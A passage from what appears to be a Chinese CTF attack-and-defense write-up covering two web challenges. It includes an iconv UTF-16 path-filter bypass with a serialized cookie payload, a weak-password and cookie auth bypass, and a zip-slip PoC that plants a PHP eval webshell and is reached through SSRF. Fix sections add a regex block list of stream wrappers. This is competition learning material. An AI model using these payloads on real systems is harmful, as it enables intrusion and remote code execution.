class="title">green</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">brand</span>-<span class="title">title</span> <span class="title">link</span>&quot; <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">MediaDrive</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">badge</span>&quot;&gt;<span class="title">Preview</span>&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">actions</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">ghost</span>&quot; <span class="title">href</span>=&quot;/<span class="title">profile</span>.<span class="title">php</span>&quot;&gt;<span class="title">Preferences</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">section</span> <span class="title">class</span>=&quot;<span class="title">card</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">card</span>-<span class="title">head</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">h2</span>&gt;<span class="title">File</span> <span class="title">Preview</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">muted</span>&quot;&gt;<span class="title">Converted</span> <span class="title">paths</span> <span class="title">are</span> <span class="title">shown</span> <span class="title">for</span> <span class="title">debugging</span>.&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">kv</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">div</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">k</span>&quot;&gt;<span class="title">User</span>&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">v</span>&quot;&gt;&lt;?= <span class="title">Util</span>::<span class="title">h</span>($<span class="title">user</span>-&gt;<span class="title">name</span>) ?&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">div</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">k</span>&quot;&gt;<span class="title">Encoding</span>&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">v</span> <span class="title">mono</span>&quot;&gt;&lt;?= <span class="title">Util</span>::<span class="title">h</span>($<span class="title">user</span>-&gt;<span class="title">encoding</span>) ?&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">div</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">k</span>&quot;&gt;<span class="title">Raw</span> <span class="title">path</span>&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">v</span> <span class="title">mono</span>&quot;&gt;&lt;?= <span class="title">Util</span>::<span class="title">h</span>($<span class="title">displayRaw</span>) ?&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">div</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">k</span>&quot;&gt;<span class="title">Converted</span>&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">v</span> <span class="title">mono</span>&quot;&gt;&lt;?= <span class="title">Util</span>::<span class="title">h</span>($<span class="title">displayConv</span>) ?&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>-<span class="title">actions</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">ghost</span>&quot; <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">Back</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span>&quot; <span class="title">href</span>=&quot;/<span class="title">download</span>.<span class="title">php</span>?<span class="title">f</span>=&lt;?= <span class="title">urlencode</span>($<span class="title">f</span>) ?&gt;&quot;&gt;<span class="title">Download</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">preview</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">isText</span>): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">pre</span>&gt;&lt;?= <span class="title">Util</span>::<span class="title">h</span>($<span class="title">content</span>) ?&gt;&lt;/<span class="title">pre</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">pre</span> <span class="title">class</span>=&quot;<span class="title">mono</span>&quot;&gt;&lt;?=</span></span><br><span class="line"><span class="class">              <span class="title">Util</span>::<span class="title">h</span>(<span class="title">bin2hex</span>(<span class="title">substr</span>($<span class="title">content</span>, 0, 2048)))</span></span><br><span class="line"><span class="class">            ?&gt;&lt;/<span class="title">pre</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hint</span>&quot;&gt;<span class="title">Binary</span> <span class="title">preview</span> (<span class="title">hex</span>, <span class="title">first</span> 2<span class="title">KB</span>)&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">section</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">footer</span> <span class="title">class</span>=&quot;<span class="title">footer</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">muted</span>&quot;&gt;<span class="title">MediaDrive</span> · <span class="title">Internal</span> <span class="title">tool</span>&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">muted</span>&quot; <span class="title">href</span>=&quot;/<span class="title">health</span>.<span class="title">php</span>&quot;&gt;<span class="title">health</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">footer</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>留意到函数 <code>iconv</code>，经过查询手册，我们可以发现这个函数是用来转换字符的编码的，那么我们就可以利用这个编码，来实现对 <code>preg_match</code> 检测的绕过，我们首先构造好 UTF-16 编码的字符串。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$convertedPath</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;UTF-16&quot;</span>, <span class="variable">$f</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$convertedPath</span>);</span><br></pre></td></tr></table></figure>
+<p>然后，我们滞空 User 类中的 <code>basePath</code> 即可，将路径完全交给 <code>$f</code> 变量控制，然后我们将编码值改成 <code>UTF-16</code> 即可完成攻击利用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="string">&quot;UTF-16&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> <span class="variable">$basePath</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>()));</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/preview.php?f=%FE%FF%<span class="number">00</span>%<span class="number">2</span>F%<span class="number">00</span>f%<span class="number">00</span>l%<span class="number">00</span>a%<span class="number">00</span>g</span><br><span class="line">Cookie: user=O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>User%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>name%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>encoding%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>UTF-<span class="number">16</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>basePath%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>或传入<code>f=fl%FFag</code>,利用GBK转UTF8忽略特殊字符的性质做绕过</p>
+<p><img src="../images/image-20260324152840185.png" alt="image-20260324152840185" /></p>
+</blockquote>
+<h3 id="fix"><a class="markdownIt-Anchor" href="#fix"></a> fix</h3>
+<p>我们只需要在它构造好的最终路径，添加防止路径穿越的函数，即可完成修复。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$convertedPath</span> = <span class="title function_ invoke__">realpath</span>(@<span class="title function_ invoke__">iconv</span>(<span class="variable">$user</span>-&gt;encoding, <span class="string">&quot;UTF-8//IGNORE&quot;</span>, <span class="variable">$rawPath</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$convertedPath</span> === <span class="literal">false</span> || <span class="variable">$convertedPath</span> === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">500</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Conversion failed&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>顺便修一下反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;basePath = <span class="string">&quot;/var/www/html/uploads/&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>接着就是看起来会被cookie反序列化覆盖的地方就原来的代码复制几份：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uploadsDir</span> = <span class="string">&quot;/var/www/html/uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|\/flag|\.\.|php:|data:|expect:/i&#x27;</span>, <span class="variable">$convertedPath</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Access denied&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="easy_time"><a class="markdownIt-Anchor" href="#easy_time"></a> easy_time</h2>
+<h3 id="break-3"><a class="markdownIt-Anchor" href="#break-3"></a> break</h3>
+<blockquote>
+<p>预期解似乎是opcache rce</p>
+</blockquote>
+<p>首先弱口令<code>admin/secret</code>可以直接进后台，或者直接<code>Cookie</code>中<code>visited=yes;user=admin;</code>即可绕过鉴权</p>
+<p>审计代码，发现这个项目存在 SSRF 漏洞，我们可以控制 <code>avatar_url</code> 的参数，从而去访问到内网的 php 服务。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/about&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">about</span>():</span><br><span class="line">    user = flask.request.cookies.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    conn = db()</span><br><span class="line">    current = conn.execute(<span class="string">&#x27;SELECT * FROM users WHERE username=?&#x27;</span>, (user,)).fetchone()</span><br><span class="line">    about_text = current[<span class="string">&#x27;about&#x27;</span>] <span class="keyword">if</span> current <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    avatar_local = current[<span class="string">&#x27;avatar_local&#x27;</span>] <span class="keyword">if</span> current <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    avatar_url = current[<span class="string">&#x27;avatar_url&#x27;</span>] <span class="keyword">if</span> current <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        about_text = flask.request.form.get(<span class="string">&#x27;about&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        avatar_url = flask.request.form.get(<span class="string">&#x27;avatar_url&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        upload = flask.request.files.get(<span class="string">&#x27;avatar_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> upload <span class="keyword">and</span> upload.filename:</span><br><span class="line">            raw = upload.read()</span><br><span class="line">            upload.seek(<span class="number">0</span>)</span><br><span class="line">            kind = sniff_image_type(raw)</span><br><span class="line">            <span class="keyword">if</span> kind <span class="keyword">not</span> <span class="keyword">in</span> &#123;<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;webp&#x27;</span>&#125;:</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">return</span> (</span><br><span class="line">                    flask.render_template(</span><br><span class="line">                        <span class="string">&#x27;about.html&#x27;</span>,</span><br><span class="line">                        user=user,</span><br><span class="line">                        about=about_text,</span><br><span class="line">                        avatar_local=avatar_local,</span><br><span class="line">                        avatar_url=avatar_url,</span><br><span class="line">                        remote_info=fetch_remote_avatar_info(avatar_url),</span><br><span class="line">                        error=<span class="string">&#x27;头像文件必须是图片（png/jpg/gif/webp）&#x27;</span>,</span><br><span class="line">                    ),</span><br><span class="line">                    <span class="number">400</span>,</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            fname = <span class="string">f&quot;<span class="subst">&#123;uuid4().<span class="built_in">hex</span>&#125;</span>.<span class="subst">&#123; <span class="string">&#x27;jpg&#x27;</span> <span class="keyword">if</span> kind == <span class="string">&#x27;jpeg&#x27;</span> <span class="keyword">else</span> kind &#125;</span>&quot;</span></span><br><span class="line">            path = AVATAR_DIR / fname</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(raw)</span><br><span class="line">            avatar_local = <span class="string">f&quot;uploads/avatars/<span class="subst">&#123;fname&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        conn.execute(</span><br><span class="line">            <span class="string">&#x27;UPDATE users SET about=?, avatar_local=?, avatar_url=? WHERE username=?&#x27;</span>,</span><br><span class="line">            (about_text, avatar_local, avatar_url, user),</span><br><span class="line">        )</span><br><span class="line">        conn.commit()</span><br><span class="line"></span><br><span class="line">        current = conn.execute(<span class="string">&#x27;SELECT * FROM users WHERE username=?&#x27;</span>, (user,)).fetchone()</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flask.render_template(</span><br><span class="line">            <span class="string">&#x27;about.html&#x27;</span>,</span><br><span class="line">            user=user,</span><br><span class="line">            about=current[<span class="string">&#x27;about&#x27;</span>],</span><br><span class="line">            avatar_local=current[<span class="string">&#x27;avatar_local&#x27;</span>],</span><br><span class="line">            avatar_url=current[<span class="string">&#x27;avatar_url&#x27;</span>],</span><br><span class="line">            remote_info=fetch_remote_avatar_info(current[<span class="string">&#x27;avatar_url&#x27;</span>]),</span><br><span class="line">            error=<span class="literal">None</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(</span><br><span class="line">        <span class="string">&#x27;about.html&#x27;</span>,</span><br><span class="line">        user=user,</span><br><span class="line">        about=about_text,</span><br><span class="line">        avatar_local=avatar_local,</span><br><span class="line">        avatar_url=avatar_url,</span><br><span class="line">        remote_info=fetch_remote_avatar_info(avatar_url),</span><br><span class="line">        error=<span class="literal">None</span>,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+<p>后面发现可以上传zip并解压，直接制作一个路径穿越的压缩包，上传php马进去</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">safe_upload</span>(<span class="params">zip_path: Path, dest_dir: Path</span>) -&gt; <span class="built_in">list</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> z:</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> z.infolist():</span><br><span class="line">            target = os.path.join(dest_dir, info.filename)  </span><br><span class="line">            <span class="keyword">if</span> info.is_dir():</span><br><span class="line">                os.makedirs(target, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.makedirs(os.path.dirname(target), exist_ok=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(target, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(z.read(info.filename))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/plugin/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_plugin</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;plugin_upload.html&#x27;</span>, error=<span class="literal">None</span>, ok=<span class="literal">None</span>, files=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    file = flask.request.files.get(<span class="string">&#x27;plugin&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file <span class="keyword">or</span> <span class="keyword">not</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;plugin_upload.html&#x27;</span>, error=<span class="string">&#x27;请选择一个 zip 文件&#x27;</span>, ok=<span class="literal">None</span>, files=<span class="literal">None</span>), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    filename = secure_filename(file.filename)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename.lower().endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;plugin_upload.html&#x27;</span>, error=<span class="string">&#x27;仅支持 .zip 文件&#x27;</span>, ok=<span class="literal">None</span>, files=<span class="literal">None</span>), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    saved = UPLOAD_DIR / <span class="string">f&quot;<span class="subst">&#123;uuid4().<span class="built_in">hex</span>&#125;</span>-<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">    file.save(saved)</span><br><span class="line"></span><br><span class="line">    dest = PLUGIN_DIR / <span class="string">f&quot;<span class="subst">&#123;Path(filename).stem&#125;</span>-<span class="subst">&#123;uuid4().<span class="built_in">hex</span>[:<span class="number">8</span>]&#125;</span>&quot;</span></span><br><span class="line">    dest.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(saved, dest)</span><br><span class="line">        extracted = safe_upload(saved, dest)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        shutil.rmtree(dest, ignore_errors=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;plugin_upload.html&#x27;</span>, error=<span class="string">&#x27;解压失败：压缩包内容不合法&#x27;</span>, ok=<span class="literal">None</span>, files=<span class="literal">None</span>), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;plugin_upload.html&#x27;</span>, error=<span class="literal">None</span>, ok=<span class="string">&#x27;上传并解压成功&#x27;</span>, files=extracted)</span><br></pre></td></tr></table></figure>
+<p>POC:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(<span class="string">&quot;exp.zip&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> zipf:</span><br><span class="line">    zipf.writestr(<span class="string">&quot;../../../../../../../var/www/html/shell.php&quot;</span>, <span class="string">&quot;&lt;?php eval($_GET[1]);?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>最后，上传压缩包，打 SSRF 即可 RCE。</p>
+<p><code>ls /</code>发现有<code>entrypoint.sh</code>，读一下找到flag位置<code>/tmp/123123123_flag</code></p>
+<p><img src="../images/image-20260324151726351.png" alt="image-20260324151726351" /></p>
+<h3 id="fix-2"><a class="markdownIt-Anchor" href="#fix-2"></a> fix</h3>
+<p>首先把secret_key修复, 随便替换一个即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.secret_key = &quot;dev-secret-change-0raysnb375813798479058749078590287039&quot; </span><br></pre></td></tr></table></figure>
+<p>然后把cookie字段名替换, 替换后基本上原脚本就打不通了, 这里基本属于奇技淫巧, 反正脚本打不通就行</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">resp.set_cookie(<span class="string">&#x27;ccbvisited&#x27;</span>, <span class="string">&#x27;yes&#x27;</span>, httponly=<span class="literal">True</span>, samesite=<span class="string">&#x27;Lax&#x27;</span>)</span><br><span class="line">resp.set_cookie(<span class="string">&#x27;ccbuser&#x27;</span>, username, httponly=<span class="literal">True</span>, samesite=<span class="string">&#x27;Lax&#x27;</span>)</span><br><span class="line">flask.request.cookies.get(<span class="string">&#x27;ccbuser&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>正经的修复应该是替换成flask.session来管理, 还有把safe_upload换成safe_extract_zip方法</p>
+<p>检测靶机不会自动重启服务, <code>supervisord</code>会自动重启, 注意是要<code>pkill</code>而不是<code>killall python3</code>,<code>supervisord</code>是<code>python3</code>起的, 杀了容</p>
+<p>器就没了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">mv</span> index.py /app/index.py</span><br><span class="line">pkill -f <span class="string">&quot;/app/index.py&quot;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
